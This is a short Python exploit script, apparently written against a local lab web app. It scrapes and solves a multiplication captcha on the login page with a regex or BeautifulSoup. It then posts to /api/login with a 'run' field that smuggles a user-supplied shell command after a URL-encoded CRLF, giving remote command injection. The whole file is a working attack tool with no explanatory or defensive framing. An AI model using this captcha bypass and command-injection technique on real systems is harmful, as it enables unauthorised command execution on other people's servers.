#!/usr/bin/python3
import urllib.parse
import requests
import re
from bs4 import BeautifulSoup


def main():
	# command to inject
	print("command to execute:")
	cmd = input("$ ")

	# make the request to the login page
	res = requests.get("http://127.0.0.1:5000/login")

	# bypass captcha
	captcha_result = bypass_captcha_with_regex(res.text)
	# captcha_result = bypass_captcha_with_bs4(res.text)

	# inject command
	if captcha_result == 0:
		inject_cmd(cmd)
	else:
		inject_cmd(cmd, captcha_result)


def inject_cmd(cmd, captcha = 0):
	# request headers
	headers = {
				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
				"Content-Type": "application/x-www-form-urlencoded"
	}

	# post data
	data = {
			"username": "test",
			"password": "test",
			"captcha": str(captcha),
			"run": urllib.parse.quote("echo 'pwn'") + "%0D%0A" + urllib.parse.quote(cmd)
	}

	# vulnerable endpoint
	url = "http://127.0.0.1:5000/api/login"

	# send the request
	requests.post(url, headers = headers, data = data)

	print("command executed successfully.")


def bypass_captcha_with_regex(response):
	multiplier = re.findall(r"<div class=\"multiplier\".*>(\d)</div>", response)
	multiplicand = re.findall(r"<div class=\"multiplicand\".*>(\d)</div>", response)

	# check if captcha exists
	if len(multiplier) == 0 or len(multiplicand) == 0:
		return 0
	else:
		# solve captcha
		captcha_result = int(multiplier[0]) * int(multiplicand[0])
		return captcha_result


def bypass_captcha_with_bs4(response):
	soup = BeautifulSoup(response, "html.parser")
	multiplier = soup.find("div", class_ = "multiplier")
	multiplicand = soup.find("div", class_ = "multiplicand")

	# check if captcha exists
	if multiplier == None or multiplicand == None:
		return 0
	else:
		# solve captcha
		captcha_result = int(multiplier.string) * int(multiplicand.string)
		return captcha_result


if __name__ == "__main__":
	main()

